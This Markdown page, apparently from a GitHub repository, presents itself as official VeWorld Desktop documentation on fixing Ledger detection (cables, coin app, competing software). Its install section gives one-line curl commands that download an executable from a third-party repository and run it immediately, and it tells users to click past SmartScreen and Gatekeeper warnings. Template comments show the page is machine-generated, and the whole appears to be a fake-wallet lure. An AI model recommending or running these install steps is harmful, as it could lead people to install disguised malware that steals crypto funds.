![VeWorld Desktop](../assets/banner-article.png)

# VeChain Ledger Sync: Not Detected by VeWorld Desktop

Cable, port, coin app, competing software

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> Every signature is approved on the device screen, so read it there rather than in the app window.

When VeWorld Desktop cannot see a Ledger, the cause is nearly always outside the wallet: a charge-only cable, a hub, a closed VeChain app, or another program holding the device. Working through those four in order resolves the large majority of detection failures without touching the wallet at all.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

The <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger pairing flow in VeWorld Desktop</a> waits at a connection step, the device shows as connected on its own screen but not in the app, or an account that worked yesterday fails to appear today after the device was unplugged and replugged.

| Symptom | Most likely cause | First test |
|---|---|---|
| No device found at all | Charge-only cable or dead port | Try a known data cable, direct port |
| Device found, then lost | Power management or a hub | Change port, disable USB sleep |
| Device found, no accounts | Wrong coin app open | Open VeChain on the device |
| Account fails at signature | Device asleep or busy | Wake it, reopen the app |
| Works elsewhere, not here | Another program holds the device | Close other wallet software |

## Why it happens

A hardware wallet is a USB device first and a wallet second. The operating system has to enumerate it, grant the application access, and keep that access while a session runs. Any break in that chain looks identical from inside the wallet: nothing appears, or something appears and then disappears.

Cables cause more of these failures than any software fault. A charging cable carries power and no data, so the device lights up, the operating system may even show power delivery, and no enumeration happens. The failure is silent because nothing is broken - the wire simply cannot carry the conversation.

The coin app matters because a Ledger runs one application at a time and answers only for that application. A device sitting on its dashboard, or in a different coin's app, will not respond to a VeChain request. The device looks ready in the ordinary sense while being unavailable in the sense that counts.

Operating systems also power-manage USB ports, suspending a device that sits idle while someone reads a confirmation prompt. The device sleeps, the session ends, and the wallet reports a disconnect that feels like a fault but is the machine conserving power.

Programs compete for the device. Desktop wallet software, the vendor's own manager application and any other client all want exclusive access, and the first one to claim it keeps it until it releases. That is why a device that works in one application refuses to appear in another until the first is closed.

## Fix

1. Swap the cable for one that carries data, and plug directly into the machine rather than through a hub or a monitor.
2. Unlock the device with its PIN and open the VeChain app, leaving it on screen.
3. Close other wallet or device-manager software that might be holding the device.
4. Restart the Ledger account flow in the app and wait for detection before touching the device again.
5. If accounts appear but are empty, add the next index and compare the address shown on the device with the one in the app.
6. Complete one small signature to confirm the session is stable before doing anything larger.

## If that did not work

If the device is detected but drops mid-flow, check the machine's USB power settings, and try a powered port on the machine itself rather than one on a monitor or a dock. A port that browns out under a small load behaves exactly like a cable fault, and swapping ports is the fastest way to tell the two apart. Aggressive sleep on an idle port will suspend a device that is waiting for a confirmation, and the wallet experiences that as a disconnect.

If the device shows a prompt that the app never sees, the request was built but not answered. Unlock the device, reopen the VeChain app, and retry from the start of the flow rather than from the confirmation step.

If the device is not detected on any machine, the fault is with the device or its cable rather than with the wallet. Test with a different computer before concluding anything about the app.

## Prevention

- Keep a data cable reserved for the device, labelled, so it is never confused with a charging cable.
- Open the coin app before starting a Ledger flow, every time.
- Close competing wallet software during hardware sessions.
- Never enter the <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">recovery phrase</a>; the device holds the keys, and the phrase belongs on paper only.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Why does my computer see the Ledger but the wallet does not?

Because enumeration and application access are different steps. Another program may hold the device, or the coin app may not be open, and both leave the device visible to the system while unavailable to the wallet.

### Can a bad cable still power the device?

Yes. A charge-only cable delivers power without data, so the screen lights up and nothing else happens. That is the most common detection failure.

### Do I need the Ledger manager app open?

No, and having it open can block the wallet by claiming the device. Open it only when you are updating the device itself.

### Does the wallet support Bluetooth Ledgers?

The desktop pairing is a USB connection. Bluetooth belongs to the device's own mobile arrangement and is a separate path.

### Is a detection failure a sign of a damaged wallet?

Not of the wallet software. If the device is not detected on a second machine with a data cable, the problem sits with the device rather than the application.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Pairing a Ledger from the start](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md)
- [Running two devices against one wallet](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/two-vechain-ledger-wallets-veworld-desktop.md)
- [Why an empty account appears after connecting](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [What a hardware wallet protects against](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-ledger-wallet-losses-veworld-desktop.md)
- [Does an older Nano S still work](https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/vechain-nano-s-in-veworld-desktop.md)